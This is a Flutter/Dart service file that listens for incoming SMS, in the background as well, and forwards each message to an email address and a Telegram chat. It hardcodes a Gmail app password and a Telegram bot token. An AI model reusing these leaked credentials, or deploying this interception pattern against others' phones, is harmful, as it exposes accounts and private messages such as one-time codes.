import 'package:flutter/services.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:sms_sender/core/globals/globals.dart';
import 'package:sms_sender/core/helpers/format_sms_helper.dart';
import 'package:another_telephony/telephony.dart';
import 'package:http/http.dart' as http;

import 'local_storage_service.dart';

class SmsService {
  SmsService._();
  static final SmsService instance = SmsService._();

  Future<void> initSmsService() async {
    final bool? granted = await Telephony.instance.requestSmsPermissions;

    if (granted ?? false) {
      Telephony.instance.listenIncomingSms(
        onBackgroundMessage: handleBackgorundSms,
        onNewMessage: (smsMessage) async {
          if (email != null && chatID != null) {
            await Future.wait(
              [
                sendToEmail(email: email!, smsMessage: smsMessage),
                sendToTelegram(chaID: chatID!, smsMessage: smsMessage),
              ],
            );
          }
        },
      );
    } else {
      SystemNavigator.pop();
    }
  }

  Future<void> sendToEmail(
      {SmsMessage? smsMessage,
      String? directMessage,
      required String email}) async {
    final smtpServer = gmail('smsbot38@gmail.com', 'vsix lwrs bxrd ouyk');
    final message = Message()
      ..from = const Address('smsbot38@gmail.com')
      ..recipients.add(email)
      ..subject = 'SMS Recieved'
      ..text = directMessage ?? FormatSmsHelper.formatSms(smsMessage!);
    await send(message, smtpServer);
  }

  Future<void> sendToTelegram(
      {SmsMessage? smsMessage,
      String? directMessage,
      required String chaID}) async {
    // Replace with your bot token and chat ID
    const String botToken = '7419808739:AAF7if3qBNk5Ocq0blOy-nj4lcgurNqPUug';

    const String url = 'https://api.telegram.org/bot$botToken/sendMessage';

    await http.post(
      Uri.parse(url),
      body: {
        'chat_id': chaID,
        'text': directMessage ?? FormatSmsHelper.formatSms(smsMessage!),
      },
    );
  }
}

// Background message handler (must be a static or top-level function)
// Prevents Flutter from tree-shaking this function
@pragma('vm:entry-point')
dynamic handleBackgorundSms(SmsMessage message) async {
  await LocalStorageService.init();

  final String? email = await LocalStorageService.getSecureData(key: 'email');
  final String? chatID = await LocalStorageService.getSecureData(key: 'chatID');
  if (email != null && chatID != null) {
    await Future.wait(
      [
        SmsService.instance.sendToEmail(email: email, smsMessage: message),
        SmsService.instance.sendToTelegram(chaID: chatID, smsMessage: message),
      ],
    );
  }
}
